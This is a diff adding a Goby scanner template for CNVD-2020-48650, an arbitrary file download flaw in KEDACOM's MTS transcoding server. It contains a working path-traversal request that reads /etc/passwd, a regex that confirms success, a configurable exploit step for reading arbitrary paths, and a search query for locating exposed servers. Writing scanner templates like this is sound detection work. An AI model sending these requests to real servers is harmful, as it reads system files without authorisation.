@@ -1,0 +1,98 @@
+{
+      "Name": "KEDACOM MTS transcoding server Arbitrary file download CNVD-2020-48650",
+      "Level": "1",
+      "Tags": [
+            "fileread"
+      ],
+      "GobyQuery": "title=\"MTS转码服务器\"",
+      "Description": "MTS transcoding server has arbitrary file read vulnerability. An attacker can exploit the vulnerability to read root directory files.",
+      "Product": "MTS transcoding server",
+      "Homepage": "https://www.kedacom.com/",
+      "Author": "luckying1314@139.com",
+      "Impact": "<p>MTS transcoding server has arbitrary file read vulnerability. An attacker can exploit the vulnerability to read root directory files.<br></p>",
+      "Recommendation": "<p>The manufacturer has provided a solution to patch the vulnerability. Please pay attention to the manufacturer's home page for timely updates:</p><p><a href>https://www.kedacom.com/cn/</a></p>",
+      "References": [
+            "https://www.cnvd.org.cn/flaw/show/CNVD-2020-48650"
+      ],
+      "HasExp": true,
+      "ExpParams": [
+            {
+                  "Name": "path",
+                  "Type": "input",
+                  "Value": "../../../../../../../../etc/passwd"
+            }
+      ],
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/download/../../../../../../../../etc/passwd",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "regex",
+                                    "value": "root:[x*]?:0:0:",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/download/{{{path}}}",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody||undefined"
+                  ]
+            }
+      ],
+      "PostTime": "2021-09-14 18:39:08",
+      "GobyVersion": "1.8.300"
+}
